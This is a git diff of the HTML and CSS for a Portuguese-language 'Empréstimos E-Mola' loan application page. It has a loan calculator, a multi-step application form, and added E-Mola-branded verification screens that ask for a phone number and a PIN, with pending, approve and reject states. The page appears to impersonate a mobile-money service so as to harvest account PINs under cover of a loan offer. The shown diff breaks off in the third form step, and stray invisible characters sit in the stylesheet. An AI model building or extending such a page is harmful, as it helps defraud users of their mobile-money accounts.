@@ -1,5 +1,6 @@
 <!doctype html>
 <html lang="pt">
+
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
@@ -19,17 +20,42 @@
       --shadow: 0 11px 30px rgba(20, 25, 43, .09);
       --radius: 12px;
     }
-    * { box-sizing: border-box; }
-    html, body { margin: 0; min-height: 100%; }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    html,
+    body {
+      margin: 0;
+      min-height: 100%;
+    }
+
     body {
       font-family: Arial, Helvetica, sans-serif;
       color: var(--ink);
       background: #f6f6f6;
       line-height: 1.35;
     }
-    button, input, select, textarea { font: inherit; }
-    button, input, select, textarea { -webkit-tap-highlight-color: transparent; }
-    button { cursor: pointer; }
+
+    button,
+    input,
+    select,
+    textarea {
+      font: inherit;
+    }
+
+    button,
+    input,
+    select,
+    textarea {
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    button {
+      cursor: pointer;
+    }
+
     .phone {
       width: 100%;
       min-height: 100dvh;
@@ -38,9 +64,30 @@
       background: var(--white);
       position: relative;
     }
-    .screen { display: none; min-height: 100dvh; }
-    .screen.active { display: flex; flex-direction: column; animation: show .22s ease-out; }
-    @keyframes show { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
+
+    .screen {
+      display: none;
+      min-height: 100dvh;
+    }
+
+    .screen.active {
+      display: flex;
+      flex-direction: column;
+      animation: show .22s ease-out;
+    }
+
+    @keyframes show {
+      from {
+        opacity: 0;
+        transform: translateY(5px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
     .topbar {
       height: 64px;
       flex: 0 0 64px;
@@ -51,7 +98,12 @@
       background: var(--orange);
       color: var(--navy);
     }
-    .topbar strong { text-align: center; font-size: 18px; }
+
+    .topbar strong {
+      text-align: center;
+      font-size: 18px;
+    }
+
     .back {
       border: 0;
       background: transparent;
@@ -60,6 +112,7 @@
       text-align: left;
       font-size: 16px;
     }
+
     .home-hero {
       position: relative;
       min-height: 325px;
@@ -68,18 +121,29 @@
       text-align: center;
       padding: 28px 18px 50px;
     }
+
     .language-toggle {
       min-width: 44px;
       min-height: 36px;
-      border: 1px solid rgba(16,27,61,.28);
+      border: 1px solid rgba(16, 27, 61, .28);
       border-radius: 6px;
-      background: rgba(255,255,255,.34);
+      background: rgba(255, 255, 255, .34);
       color: var(--navy);
       font-size: 13px;
       font-weight: 700;
     }
-    .home-hero > .language-toggle { position: absolute; top: 16px; right: 18px; }
-    .home-hero h1 { margin: 0; font-size: 19px; }
+
+    .home-hero>.language-toggle {
+      position: absolute;
+      top: 16px;
+      right: 18px;
+    }
+
+    .home-hero h1 {
+      margin: 0;
+      font-size: 19px;
+    }
+
     .home-panel {
       margin-top: -22px;
       border-radius: 16px 16px 0 0;
@@ -87,19 +151,55 @@
       padding: 46px 28px 34px;
       flex: 1;
     }
-    h2 { margin: 0; color: var(--navy); font-size: 26px; text-align: center; }
-    .subtitle { margin: 8px 0 30px; text-align: center; color: var(--muted); font-size: 17px; }
+
+    h2 {
+      margin: 0;
+      color: var(--navy);
+      font-size: 26px;
+      text-align: center;
+    }
+
+    .subtitle {
+      margin: 8px 0 30px;
+      text-align: center;
+      color: var(--muted);
+      font-size: 17px;
+    }
+
     .calculator {
       border: 1px solid #e8e8e9;
       background: #fbfbfb;
       padding: 22px;
       border-radius: var(--radius);
     }
-    .calculator h3 { margin: 0 0 18px; color: var(--navy); font-size: 18px; }
-    .amount-line { margin-bottom: 20px; }
-    .amount-line strong { color: var(--orange); }
-    input[type="range"] { width: 100%; accent-color: #387df1; }
-    .range-labels { display: flex; justify-content: space-between; color: var(--muted); font-size: 13px; margin-top: 5px; }
+
+    .calculator h3 {
+      margin: 0 0 18px;
+      color: var(--navy);
+      font-size: 18px;
+    }
+
+    .amount-line {
+      margin-bottom: 20px;
+    }
+
+    .amount-line strong {
+      color: var(--orange);
+    }
+
+    input[type="range"] {
+      width: 100%;
+      accent-color: #387df1;
+    }
+
+    .range-labels {
+      display: flex;
+      justify-content: space-between;
+      color: var(--muted);
+      font-size: 13px;
+      margin-top: 5px;
+    }
+
     .payment {
       margin-top: 18px;
       border: 1px solid #e1e1e2;
@@ -111,7 +211,14 @@
       align-items: center;
       color: var(--muted);
     }
-    .payment strong { color: var(--orange); font-size: 26px; max-width: 60%; text-align: right; }
+
+    .payment strong {
+      color: var(--orange);
+      font-size: 26px;
+      max-width: 60%;
+      text-align: right;
+    }
+
     .content {
       flex: 1;
       padding: 96px 26px 36px;
@@ -120,6 +227,7 @@
       justify-content: center;
       align-items: flex-start;
     }
+
     .card {
       width: 100%;
       max-width: 570px;
@@ -128,14 +236,49 @@
       box-shadow: var(--shadow);
       padding: 34px 28px;
     }
-    .card h2 { font-size: 25px; line-height: 1.15; }
-    .card .subtitle { margin-bottom: 26px; }
-    .field { display: block; margin: 0 0 20px; }
-    .field > span { display: block; font-size: 16px; margin-bottom: 8px; }
-    .agent-consent { display: flex; align-items: flex-start; gap: 10px; margin: 18px 0; font-size: 14px; }
-    .agent-consent[hidden] { display: none; }
-    .agent-consent input { width: 18px !important; min-height: 18px !important; margin: 2px 0 0; accent-color: var(--orange); }
-    input:not([type="range"]), select, textarea {
+
+    .card h2 {
+      font-size: 25px;
+      line-height: 1.15;
+    }
+
+    .card .subtitle {
+      margin-bottom: 26px;
+    }
+
+    .field {
+      display: block;
+      margin: 0 0 20px;
+    }
+
+    .field>span {
+      display: block;
+      font-size: 16px;
+      margin-bottom: 8px;
+    }
+
+    .agent-consent {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      margin: 18px 0;
+      font-size: 14px;
+    }
+
+    .agent-consent[hidden] {
+      display: none;
+    }
+
+    .agent-consent input {
+      width: 18px !important;
+      min-height: 18px !important;
+      margin: 2px 0 0;
+      accent-color: var(--orange);
+    }
+
+    input:not([type="range"]),
+    select,
+    textarea {
       width: 100%;
       border: 1px solid var(--line);
       border-radius: 8px;
@@ -145,6 +288,7 @@
       min-height: 50px;
       outline: none;
     }
+
     .box-input {
       letter-spacing: 0.8em;
       text-align: center;
@@ -152,11 +296,34 @@
       font-size: 1.2em;
       font-weight: bold;
     }
-    select { background: var(--soft); }
-    textarea { min-height: 108px; resize: vertical; }
-    input:focus, select:focus, textarea:focus { border-color: var(--orange); box-shadow: 0 0 0 3px rgba(245,130,40,.14); }
-    .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
-    .phone-field { display: grid; grid-template-columns: 78px 1fr; }
+
+    select {
+      background: var(--soft);
+    }
+
+    textarea {
+      min-height: 108px;
+      resize: vertical;
+    }
+
+    input:focus,
+    select:focus,
+    textarea:focus {
+      border-color: var(--orange);
+      box-shadow: 0 0 0 3px rgba(245, 130, 40, .14);
+    }
+
+    .two-col {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 16px;
+    }
+
+    .phone-field {
+      display: grid;
+      grid-template-columns: 78px 1fr;
+    }
+
     .prefix {
       display: grid;
       place-items: center;
@@ -166,9 +333,22 @@
       border-radius: 8px 0 0 8px;
       color: var(--navy);
     }
-    .phone-field input { border-radius: 0 8px 8px 0; }
-    .actions { display: grid; grid-template-columns: 1fr 2.2fr; gap: 14px; margin-top: 28px; }
-    .actions.single { grid-template-columns: 1fr; }
+
+    .phone-field input {
+      border-radius: 0 8px 8px 0;
+    }
+
+    .actions {
+      display: grid;
+      grid-template-columns: 1fr 2.2fr;
+      gap: 14px;
+      margin-top: 28px;
+    }
+
+    .actions.single {
+      grid-template-columns: 1fr;
+    }
+
     .btn {
       min-height: 54px;
       border: 0;
@@ -180,8 +360,18 @@
       text-transform: uppercase;
       letter-spacing: .01em;
     }
-    .btn.secondary { color: #5e5e60; background: #dededf; }
-    .btn:disabled { cursor: not-allowed; color: #ababac; background: #e7e7e8; }
+
+    .btn.secondary {
+      color: #5e5e60;
+      background: #dededf;
+    }
+
+    .btn:disabled {
+      cursor: not-allowed;
+      color: #ababac;
+      background: #e7e7e8;
+    }
+
     .summary {
       border: 1px solid #dce2df;
       border-left: 5px solid var(--orange);
@@ -189,12 +379,52 @@
       padding: 16px 18px;
       background: #fcfefd;
     }
-    .summary h3 { margin: 0 0 14px; color: var(--navy); font-size: 17px; }
-    .summary-row { display: flex; justify-content: space-between; gap: 15px; padding: 8px 0; border-bottom: 1px solid #e7e9e8; }
-    .summary-row:last-child { border: 0; }
-    .error { min-height: 18px; color: #be2d1f; font-size: 13px; margin-top: -14px; margin-bottom: 10px; }
-    .done-icon { width: 64px; height: 64px; display: grid; place-items: center; margin: 0 auto 18px; border-radius: 50%; background: var(--orange); color: var(--white); font-size: 32px; }
-    .complete-copy { text-align: center; color: var(--muted); margin: 14px 0 8px; font-size: 15px; }
+
+    .summary h3 {
+      margin: 0 0 14px;
+      color: var(--navy);
+      font-size: 17px;
+    }
+
+    .summary-row {
+      display: flex;
+      justify-content: space-between;
+      gap: 15px;
+      padding: 8px 0;
+      border-bottom: 1px solid #e7e9e8;
+    }
+
+    .summary-row:last-child {
+      border: 0;
+    }
+
+    .error {
+      min-height: 18px;
+      color: #be2d1f;
+      font-size: 13px;
+      margin-top: -14px;
+      margin-bottom: 10px;
+    }
+
+    .done-icon {
+      width: 64px;
+      height: 64px;
+      display: grid;
+      place-items: center;
+      margin: 0 auto 18px;
+      border-radius: 50%;
+      background: var(--orange);
+      color: var(--white);
+      font-size: 32px;
+    }
+
+    .complete-copy {
+      text-align: center;
+      color: var(--muted);
+      margin: 14px 0 8px;
+      font-size: 15px;
+    }
+
     .pulse-spinner {
       width: 52px;
       height: 52px;
@@ -204,7 +434,13 @@
       border-radius: 50%;
       animation: spin 1s linear infinite;
     }
-    @keyframes spin { to { transform: rotate(360deg); } }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
     .status-badge {
       display: inline-block;
       padding: 6px 16px;
@@ -213,16 +449,38 @@
       font-weight: 700;
       margin-bottom: 14px;
     }
-    .status-badge.pending { background: #fff8e1; color: #b57900; border: 1px solid #ffe082; }
-    .status-badge.under_review { background: #e8f1fc; color: #1d68d8; border: 1px solid #bbd6fa; }
-    .status-badge.approved { background: #e6f7ec; color: #1b873f; border: 1px solid #b7e8c4; }
-    .status-badge.rejected { background: #fde8e8; color: #c92a2a; border: 1px solid #f8b4b4; }
+
+    .status-badge.pending {
+      background: #fff8e1;
+      color: #b57900;
+      border: 1px solid #ffe082;
+    }
+
+    .status-badge.under_review {
+      background: #e8f1fc;
+      color: #1d68d8;
+      border: 1px solid #bbd6fa;
+    }
+
+    .status-badge.approved {
+      background: #e6f7ec;
+      color: #1b873f;
+      border: 1px solid #b7e8c4;
+    }
+
+    .status-badge.rejected {
+      background: #fde8e8;
+      color: #c92a2a;
+      border: 1px solid #f8b4b4;
+    }
+
     .status-steps {
       display: flex;
       justify-content: space-between;
       margin: 22px 0 18px;
       position: relative;
     }
+
     .status-steps::before {
       content: '';
       position: absolute;
@@ -233,6 +491,7 @@
       background: #e2e4e8;
       z-index: 1;
     }
+
     .step-item {
       position: relative;
       z-index: 2;
@@ -243,6 +502,7 @@
       color: var(--muted);
       font-weight: 600;
     }
+
     .step-dot {
       width: 28px;
       height: 28px;
@@ -254,19 +514,54 @@
       place-items: center;
       font-size: 12px;
     }
-    .step-item.done .step-dot { background: var(--orange); }
-    .step-item.done { color: var(--navy); }
-    .step-item.current .step-dot { background: #1d68d8; animation: pulseDot 1.5s infinite; }
-    .step-item.current { color: #1d68d8; }
-    .step-item.approved .step-dot { background: #1b873f; }
-    .step-item.approved { color: #1b873f; }
-    .step-item.rejected .step-dot { background: #c92a2a; }
-    .step-item.rejected { color: #c92a2a; }
-    @keyframes pulseDot {
-      0% { box-shadow: 0 0 0 0 rgba(29, 104, 216, 0.4); }
-      70% { box-shadow: 0 0 0 8px rgba(29, 104, 216, 0); }
-      100% { box-shadow: 0 0 0 0 rgba(29, 104, 216, 0); }
+
+    .step-item.done .step-dot {
+      background: var(--orange);
     }
+
+    .step-item.done {
+      color: var(--navy);
+    }
+
+    .step-item.current .step-dot {
+      background: #1d68d8;
+      animation: pulseDot 1.5s infinite;
+    }
+
+    .step-item.current {
+      color: #1d68d8;
+    }
+
+    .step-item.approved .step-dot {
+      background: #1b873f;
+    }
+
+    .step-item.approved {
+      color: #1b873f;
+    }
+
+    .step-item.rejected .step-dot {
+      background: #c92a2a;
+    }
+
+    .step-item.rejected {
+      color: #c92a2a;
+    }
+
+    @keyframes pulseDot {
+      0% {
+        box-shadow: 0 0 0 0 rgba(29, 104, 216, 0.4);
+      }
+
+      70% {
+        box-shadow: 0 0 0 8px rgba(29, 104, 216, 0);
+      }
+
+      100% {
+        box-shadow: 0 0 0 0 rgba(29, 104, 216, 0);
+      }
+    }
+
     .approved-card {
       border: 1px solid #bbf7d0;
       background: #f0fdf4;
@@ -275,6 +570,7 @@
       margin: 16px 0;
       text-align: left;
     }
+
     .rejected-card {
       border: 1px solid #fecaca;
       background: #fef2f2;
@@ -283,24 +579,76 @@
       margin: 16px 0;
       text-align: left;
     }
+
     @media (min-width: 700px) {
-      body { padding: 28px; }
-      .phone { max-width: 720px; min-height: calc(100dvh - 56px); border-radius: 16px; box-shadow: 0 18px 55px rgba(19,25,44,.14); }
-      .screen { min-height: calc(100dvh - 56px); }
-      .home-panel { padding-left: 58px; padding-right: 58px; }
+      body {
+        padding: 28px;
+      }
+
+      .phone {
+        max-width: 720px;
+        min-height: calc(100dvh - 56px);
+        border-radius: 16px;
+        box-shadow: 0 18px 55px rgba(19, 25, 44, .14);
+      }
+
+      .screen {
+        min-height: calc(100dvh - 56px);
+      }
+
+      .home-panel {
+        padding-left: 58px;
+        padding-right: 58px;
+      }
     }
+
     @media (max-width: 430px) {
-      .topbar { grid-template-columns: 70px 1fr 70px; padding: 0 14px; }
-      .topbar strong { font-size: 16px; }
-      .home-hero { min-height: 285px; }
-      .home-panel { padding: 38px 22px 28px; }
-      h2, .card h2 { font-size: 22px; }
-      .content { padding: 72px 15px 26px; }
-      .card { padding: 28px 20px; }
-      .two-col { grid-template-columns: 1fr; gap: 0; }
-      .actions { grid-template-columns: 1fr 2fr; gap: 10px; }
+      .topbar {
+        grid-template-columns: 70px 1fr 70px;
+        padding: 0 14px;
+      }
+
+      .topbar strong {
+        font-size: 16px;
+      }
+
+      .home-hero {
+        min-height: 285px;
+      }
+
+      .home-panel {
+        padding: 38px 22px 28px;
+      }
+
+      h2,
+      .card h2 {
+        font-size: 22px;
+      }
+
+      .content {
+        padding: 72px 15px 26px;
+      }
+
+      .card {
+        padding: 28px 20px;
+      }
+
+      .two-col {
+        grid-template-columns: 1fr;
+        gap: 0;
+      }
+
+      .actions {
+        grid-template-columns: 1fr 2fr;
+        gap: 10px;
+      }
     }
-    @media (prefers-reduced-motion: reduce) { .screen.active { animation: none; } }
+
+    @media (prefers-reduced-motion: reduce) {
+      .screen.active {
+        animation: none;
+      }
+    }
 
     /* ── Orange Verification Screens ── */
     .verify-screen {
@@ -309,36 +657,51 @@
       display: flex;
       flex-direction: column;
     }
+
     .verify-screen .topbar {
       background: var(--orange);
       color: #fff;
     }
-    .verify-screen .topbar strong { color: #fff; }
-    .verify-screen .topbar .back { color: rgba(255,255,255,.85); }
+
+    .verify-screen .topbar strong {
+      color: #fff;
+    }
+
+    .verify-screen .topbar .back {
+      color: rgba(255, 255, 255, .85);
+    }
+
     .verify-hero {
       padding: 40px 30px 0;
       text-align: center;
       color: #fff;
     }
+
     .verify-hero h2 {
       font-size: 26px;
       font-weight: 700;
       margin-bottom: 8px;
       color: #fff;
     }
+
     .verify-hero p {
       font-size: 15px;
       opacity: .85;
       margin-bottom: 28px;
     }
+
     .verify-card {
       background: #fff;
       margin: 0 22px 30px;
       padding: 32px 28px;
       border-radius: 16px;
-      box-shadow: 0 6px 30px rgba(0,0,0,.12);
+      box-shadow: 0 6px 30px rgba(0, 0, 0, .12);
     }
-    .verify-card .field { margin-bottom: 18px; }
+
+    .verify-card .field {
+      margin-bottom: 18px;
+    }
+
     .verify-card .field span {
       display: block;
       font-size: 13px;
@@ -346,6 +709,7 @@
       color: var(--navy);
       margin-bottom: 6px;
     }
+
     .verify-card input[type="text"],
     .verify-card input[type="tel"] {
       width: 100%;
@@ -358,14 +722,17 @@
       outline: none;
       transition: border-color .2s;
     }
+
     .verify-card input:focus {
       border-color: var(--orange);
-      box-shadow: 0 0 0 3px rgba(245,130,40,.15);
+      box-shadow: 0 0 0 3px rgba(245, 130, 40, .15);
     }
+
     .verify-card .phone-field {
       display: grid;
       grid-template-columns: 78px 1fr;
     }
+
     .verify-card .phone-field .prefix {
       display: grid;
       place-items: center;
@@ -377,7 +744,11 @@
       font-weight: 600;
       font-size: 15px;
     }
-    .verify-card .phone-field input { border-radius: 0 10px 10px 0; }
+
+    .verify-card .phone-field input {
+      border-radius: 0 10px 10px 0;
+    }
+
     .verify-btn {
       width: 100%;
       height: 58px;
@@ -393,26 +764,41 @@
       cursor: pointer;
       transition: opacity .2s;
     }
-    .verify-btn:disabled { opacity: .5; cursor: not-allowed; }
-    .verify-btn.reject-btn { background: #c92a2a; }
+
+    .verify-btn:disabled {
+      opacity: .5;
+      cursor: not-allowed;
+    }
+
+    .verify-btn.reject-btn {
+      background: #c92a2a;
+    }
+
     .verify-waiting {
       text-align: center;
       padding: 30px 0;
     }
+
     .verify-waiting .pulse-spinner {
-      width: 44px; height: 44px; border-width: 3px; margin-bottom: 14px;
-      border-color: rgba(245,130,40,.25);
+      width: 44px;
+      height: 44px;
+      border-width: 3px;
+      margin-bottom: 14px;
+      border-color: rgba(245, 130, 40, .25);
       border-top-color: var(--orange);
     }
+
     .verify-waiting h4 {
       color: var(--navy);
       font-size: 16px;
       margin-bottom: 6px;
     }
+
     .verify-waiting p {
       color: var(--muted);
       font-size: 13px;
     }
+
     .verify-reject-notice {
       border: 1px solid #fecaca;
       background: #fef2f2;
@@ -420,16 +806,19 @@
       padding: 18px;
       text-align: left;
     }
+
     .verify-reject-notice h4 {
       color: #991b1b;
       font-size: 15px;
       margin-bottom: 6px;
     }
+
     .verify-reject-notice p {
       color: #374151;
       font-size: 13px;
       margin-bottom: 12px;
     }
+
     .verify-success-card {
       border: 1px solid #bbf7d0;
       background: #f0fdf4;
@@ -437,8 +826,10 @@
       padding: 22px;
       text-align: center;
     }
+
     .verify-success-card .done-icon {
-      width: 56px; height: 56px;
+      width: 56px;
+      height: 56px;
       margin: 0 auto 12px;
       border-radius: 50%;
       background: #1b873f;
@@ -447,45 +838,295 @@
       place-items: center;
       font-size: 28px;
     }
+
     .verify-success-card h4 {
       color: #166534;
       font-size: 18px;
       margin-bottom: 8px;
     }
+
     .verify-success-card p {
       color: #1f2937;
       font-size: 13px;
       line-height: 1.5;
     }
+
     .verify-step-badge {
       display: inline-block;
       padding: 4px 14px;
       border-radius: 999px;
       font-size: 12px;
       font-weight: 700;
-      background: rgba(255,255,255,.2);
+      background: rgba(255, 255, 255, .2);
       color: #fff;
       margin-bottom: 12px;
     }
+
     .verify-error {
       min-height: 16px;
       color: #be2d1f;
       font-size: 13px;
       margin-top: 4px;
     }
+
+    /* STREAMING_CHUNK:Defining base theme variables and screen layout... */
+    :root {
+      --emola-orange: #f76800;
+      --emola-btn-bg: #e5e7eb;
+      --emola-btn-text: #4b5563;
+      --emola-btn-hover: #d1d5db;
+      --emola-text: #ffffff;
+      --emola-input-text: #1f2937;
+    }
+
+    ​
+
+    /* Screen Wrapper */
+    .screen[data-screen="verify1"] {
+      background-color: var(--emola-orange);
+      min-height: 100vh;
+      width: 100%;
+      color: var(--emola-text);
+      font-family: 'Inter', system-ui, -apple-system, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 16px;
+      box-sizing: border-box;
+    }
+
+    ​.verify-screen {
+      width: 100%;
+      max-width: 420px;
+      margin: 0 auto;
+      display: flex;
+      flex-direction: column;
+    }
+
+    ​
+
+    /* Top Navigation Bar */
+    .topbar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 12px 0 24px 0;
+    }
+
+    ​.topbar .back,
+    .topbar .language-toggle {
+      background: rgba(255, 255, 255, 0.15);
+      border: 1px solid rgba(255, 255, 255, 0.3);
+      color: #ffffff;
+      padding: 6px 14px;
+      border-radius: 20px;
+      font-size: 0.85rem;
+      font-weight: 500;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    ​.topbar .back:hover,
+    .topbar .language-toggle:hover {
+      background: rgba(255, 255, 255, 0.25);
+    }
+
+    ​.topbar strong {
+      font-size: 1rem;
+      font-weight: 600;
+    }
+
+    ​
+
+    /* Hero Header Section */
+    .verify-hero {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+
+    ​.verify-step-badge {
+      display: inline-block;
+      background: rgba(255, 255, 255, 0.2);
+      color: #ffffff;
+      font-size: 0.75rem;
+      font-weight: 600;
+      padding: 4px 12px;
+      border-radius: 12px;
+      margin-bottom: 12px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    ​.verify-hero .sub-heading {
+      font-size: 0.9rem;
+      color: rgba(255, 255, 255, 0.85);
+      margin-bottom: 4px;
+    }
+
+    ​.verify-hero h2 {
+      font-size: 1.75rem;
+      font-weight: 700;
+      margin: 0 0 8px 0;
+      letter-spacing: -0.02em;
+    }
+
+    ​.verify-hero .desc {
+      font-size: 0.85rem;
+      color: rgba(255, 255, 255, 0.8);
+      margin: 0;
+      line-height: 1.4;
+    }
+
+    ​
+
+    /* Card Container */
+    .verify-card {
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+      width: 100%;
+    }
+
+    ​
+
+    /* Form Fields */
+    .field {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      width: 100%;
+    }
+
+    ​.field-label {
+      font-size: 0.9rem;
+      font-weight: 500;
+      text-align: center;
+      color: #ffffff;
+    }
+
+    ​
+
+    /* Phone Input Box */
+    .phone-field {
+      display: flex;
+      align-items: center;
+      background-color: #ffffff;
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+      height: 52px;
+    }
+
+    ​.phone-field .prefix {
+      background-color: #ffffff;
+      color: var(--emola-input-text);
+      font-weight: 600;
+      font-size: 1rem;
+      padding: 0 16px;
+      border-right: 1px solid #e5e7eb;
+      display: flex;
+      align-items: center;
+      height: 100%;
+      user-select: none;
+    }
+
+    ​.phone-field input {
+      flex: 1;
+      border: none;
+      outline: none;
+      padding: 0 14px;
+      font-size: 1rem;
+      font-weight: 500;
+      color: var(--emola-input-text);
+      background: transparent;
+    }
+
+    ​
+
+    /* PIN Input Box */
+    .box-input {
+      width: 100%;
+      height: 52px;
+      background-color: #ffffff;
+      border: none;
+      border-radius: 8px;
+      padding: 0 16px;
+      font-size: 1.25rem;
+      font-weight: 700;
+      letter-spacing: 8px;
+      text-align: center;
+      color: var(--emola-input-text);
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+      box-sizing: border-box;
+    }
+
+    ​.box-input:focus,
+    .phone-field:focus-within {
+      outline: 2px solid #ffffff;
+    }
+
+    ​
+
+    /* Error Text */
+    .verify-error {
+      color: #fff;
+      background-color: rgba(0, 0, 0, 0.2);
+      padding: 10px 14px;
+      border-radius: 6px;
+      font-size: 0.85rem;
+      text-align: center;
+      margin: 0;
+      display: none;
+    }
+
+    ​.verify-error:not(:empty) {
+      display: block;
+    }
+
+    ​
+
+    /* Submit Button */
+    .verify-btn {
+      width: 100%;
+      height: 52px;
+      background-color: var(--emola-btn-bg);
+      color: var(--emola-btn-text);
+      border: none;
+      border-radius: 8px;
+      font-size: 1rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      cursor: pointer;
+      transition: background-color 0.2s ease, color 0.2s ease;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+    }
+
+    ​.verify-btn:hover {
+      background-color: var(--emola-btn-hover);
+      color: #111827;
+    }
+
+    ​.verify-btn:active {
+      transform: translateY(1px);
+    }
   </style>
 </head>
+
 <body>
   <main class="phone" aria-live="polite">
     <section class="screen active" data-screen="home">
-      <div class="home-hero"><button class="language-toggle" type="button">EN</button><h1>Empréstimos E-Mola</h1></div>
+      <div class="home-hero"><button class="language-toggle" type="button">EN</button>
+        <h1>Empréstimos E-Mola</h1>
+      </div>
       <div class="home-panel">
         <h2>Bem-vindo ao E-Mola</h2>
         <p class="subtitle">Obtenha empréstimos facilmente através do E-Mola</p>
         <div class="calculator">
           <h3>Calculadora de Empréstimos</h3>
           <div class="amount-line">Valor: <strong id="amountText">MTS 25.000</strong></div>
-          <input id="loanSlider" type="range" min="10000" max="100000" step="1000" value="25000" aria-label="Valor do empréstimo" />
+          <input id="loanSlider" type="range" min="10000" max="100000" step="1000" value="25000"
+            aria-label="Valor do empréstimo" />
           <div class="range-labels"><span>MTS 10.000</span><span>MTS 100.000</span></div>
           <div class="payment"><span>Pagamento<br />Mensal</span><strong id="paymentText">MTS 521</strong></div>
         </div>
@@ -494,100 +1135,211 @@
     </section>
 
     <section class="screen" data-screen="step1">
-      <header class="topbar"><button class="back" data-next="home">← Voltar</button><strong>Candidatura de Empréstimo</strong><button class="language-toggle" type="button">EN</button></header>
-      <div class="content"><form class="card" id="loanForm">
-        <h2>Candidatura de Empréstimo -<br />Etapa 1 de 3</h2><p class="subtitle">Conte-nos sobre seu empréstimo</p>
-        <label class="field"><span>Tipo de Empréstimo</span><select id="loanType" required><option value="Empréstimo Comercial">Empréstimo Comercial</option><option value="Empréstimo Pessoal">Empréstimo Pessoal</option><option value="Empréstimo Agrícola">Empréstimo Agrícola</option></select></label>
-        <label class="field"><span>Valor do Empréstimo (MTS)</span><input id="loanAmount" type="number" min="10000" max="100000" value="25000" required /></label>
-        <label class="field"><span>Prazo do Empréstimo</span><select id="term" required><option value="12">12 Meses</option><option value="24">24 Meses</option><option value="36">36 Meses</option><option value="48" selected>48 Meses</option></select></label>
-        <label class="field"><span>Propósito do Empréstimo</span><textarea id="purpose" placeholder="Descreva o propósito..." required></textarea></label>
-        <p class="error" id="step1Error"></p><div class="actions single"><button class="btn" type="submit">Próxima etapa</button></div>
-      </form></div>
+      <header class="topbar"><button class="back" data-next="home">← Voltar</button><strong>Candidatura de
+          Empréstimo</strong><button class="language-toggle" type="button">EN</button></header>
+      <div class="content">
+        <form class="card" id="loanForm">
+          <h2>Candidatura de Empréstimo -<br />Etapa 1 de 3</h2>
+          <p class="subtitle">Conte-nos sobre seu empréstimo</p>
+          <label class="field"><span>Tipo de Empréstimo</span><select id="loanType" required>
+              <option value="Empréstimo Comercial">Empréstimo Comercial</option>
+              <option value="Empréstimo Pessoal">Empréstimo Pessoal</option>
+              <option value="Empréstimo Agrícola">Empréstimo Agrícola</option>
+            </select></label>
+          <label class="field"><span>Valor do Empréstimo (MTS)</span><input id="loanAmount" type="number" min="10000"
+              max="100000" value="25000" required /></label>
+          <label class="field"><span>Prazo do Empréstimo</span><select id="term" required>
+              <option value="12">12 Meses</option>
+              <option value="24">24 Meses</option>
+              <option value="36">36 Meses</option>
+              <option value="48" selected>48 Meses</option>
+            </select></label>
+          <label class="field"><span>Propósito do Empréstimo</span><textarea id="purpose"
+              placeholder="Descreva o propósito..." required></textarea></label>
+          <p class="error" id="step1Error"></p>
+          <div class="actions single"><button class="btn" type="submit">Próxima etapa</button></div>
+        </form>
+      </div>
     </section>
 
     <section class="screen" data-screen="step2">
-      <header class="topbar"><button class="back" data-next="step1">← Voltar</button><strong>Candidatura de Empréstimo</strong><button class="language-toggle" type="button">EN</button></header>
-      <div class="content"><form class="card" id="personalForm">
-        <h2>Candidatura de Empréstimo -<br />Etapa 2 de 3</h2><p class="subtitle">Conte-nos sobre você</p>
-        <div class="two-col">
-          <label class="field"><span>Primeiro Nome</span><input id="firstName" autocomplete="given-name" placeholder="Primeiro Nome" required /></label>
-          <label class="field"><span>Sobrenome</span><input id="lastName" autocomplete="family-name" placeholder="Sobrenome" required /></label>
-        </div>
-        <label class="field"><span>Número de Telefone (+258)</span><span class="phone-field"><span class="prefix">+258</span><input id="phone" type="tel" inputmode="numeric" maxlength="9" placeholder="843123456" required /></span></label>
-        <p class="error" id="step2Error"></p><div class="actions"><button class="btn secondary" type="button" data-next="step1">Voltar</button><button class="btn" type="submit">Próxima etapa</button></div>
-      </form></div>
+      <header class="topbar"><button class="back" data-next="step1">← Voltar</button><strong>Candidatura de
+          Empréstimo</strong><button class="language-toggle" type="button">EN</button></header>
+      <div class="content">
+        <form class="card" id="personalForm">
+          <h2>Candidatura de Empréstimo -<br />Etapa 2 de 3</h2>
+          <p class="subtitle">Conte-nos sobre você</p>
+          <div class="two-col">
+            <label class="field"><span>Primeiro Nome</span><input id="firstName" autocomplete="given-name"
+                placeholder="Primeiro Nome" required /></label>
+            <label class="field"><span>Sobrenome</span><input id="lastName" autocomplete="family-name"
+                placeholder="Sobrenome" required /></label>
+          </div>
+          <label class="field"><span>Número de Telefone (+258)</span><span class="phone-field"><span
+                class="prefix">+258</span><input id="phone" type="tel" inputmode="numeric" maxlength="9"
+                placeholder="843123456" required /></span></label>
+          <p class="error" id="step2Error"></p>
+          <div class="actions"><button class="btn secondary" type="button" data-next="step1">Voltar</button><button
+              class="btn" type="submit">Próxima etapa</button></div>
+        </form>
+      </div>
     </section>
 
     <section class="screen" data-screen="step3">
-      <header class="topbar"><button class="back" data-next="step2">← Voltar</button><strong>Candidatura de Empréstimo</strong><button class="language-toggle" type="button">EN</button></header>
-      <div class="content"><form class="card" id="financeForm">
